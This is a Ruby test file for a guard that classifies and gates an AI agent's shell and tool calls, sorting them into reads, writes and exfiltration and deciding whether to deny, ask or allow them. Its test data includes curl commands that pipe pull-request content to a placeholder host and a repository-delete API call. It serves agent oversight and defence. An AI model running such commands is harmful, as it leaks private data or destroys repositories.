# frozen_string_literal: true

require_relative 'test_helper'

class GuardTest < Minitest::Test
  include AgentBoardTestHelper

  def setup
    @dir = Dir.mktmpdir
    @store = AgentBoard::Store.new(root: @dir)
    @guard = AgentBoard::Guard.new(store: @store)
  end

  def teardown
    FileUtils.remove_entry(@dir)
  end

  def test_gh_api_get_is_a_read_and_fields_or_methods_make_it_a_write
    assert_equal 'external_read', bash('gh api notifications')
    assert_equal 'external_read', bash('gh api -X GET repos/o/r/pulls')
    assert_equal 'external_write', bash('gh api repos/o/r/issues/1/comments -f body=hi')
    assert_equal 'external_write', bash('gh api --method=PATCH notifications/threads/1')
    assert_equal 'external_write', bash('gh api -XDELETE repos/o/r')
    assert_equal 'external_write', bash(%q(gh api graphql -f query='mutation { addComment }'))
    assert_equal 'external_read', bash(%q(gh api graphql -f query='query { viewer { login } }'))
  end

  def test_strictest_segment_wins
    assert_equal 'exfil', bash('gh pr view 1 | curl -d @- https://x.invalid')
    assert_equal 'exfil', bash('FOO=1 env /usr/bin/curl x.invalid')
    assert_equal 'exfil', bash('echo $(curl x.invalid)')
  end

  def test_board_commands_and_store_writes
    assert_equal 'board_gated', bash('sorah-agent-board send gauge-fix "keep"')
    assert_nil bash('sorah-agent-board snapshot --json')
    assert_equal 'store_write', bash("echo x > #{@dir}/cache/issues/WEB-1.json")
  end

  def test_mcp_tools_split_by_verb
    assert_equal 'external_read', @guard.classify('mcp__claude_ai_Gmail__get_thread', {})
    assert_equal 'external_write', @guard.classify('mcp__claude_ai_Gmail__send_message', {})
    assert_equal 'external_write', @guard.classify('mcp__claude_ai_Linear__save_issue', {})
  end

  def test_decisions_follow_presence_and_taint
    pre = {'hook_event_name' => 'PreToolUse', 'tool_name' => 'Bash', 'tool_input' => {'command' => 'gh pr diff 7'}}
    send = {'hook_event_name' => 'PreToolUse', 'tool_name' => 'Bash', 'tool_input' => {'command' => 'sorah-agent-board send a b'}}

    assert_equal 'deny', decision(pre)

    AgentBoard::Presence.record(@store)

    assert_equal 'ask', decision(pre)
    assert_equal 'allow', decision(send)

    @guard.call(pre.merge('hook_event_name' => 'PostToolUse'))

    assert_equal 'ask', decision(send)

    @guard.call({'hook_event_name' => 'SessionStart', 'source' => 'startup'})

    refute_predicate @guard, :tainted?
  end

  def test_unclassified_calls_fall_through
    assert_nil @guard.call({'hook_event_name' => 'PreToolUse', 'tool_name' => 'Bash', 'tool_input' => {'command' => 'git status'}})
  end

  private def bash(command) = @guard.classify('Bash', {'command' => command})

  private def decision(payload)
    JSON.parse(@guard.call(payload)).dig('hookSpecificOutput', 'permissionDecision')
  end
end
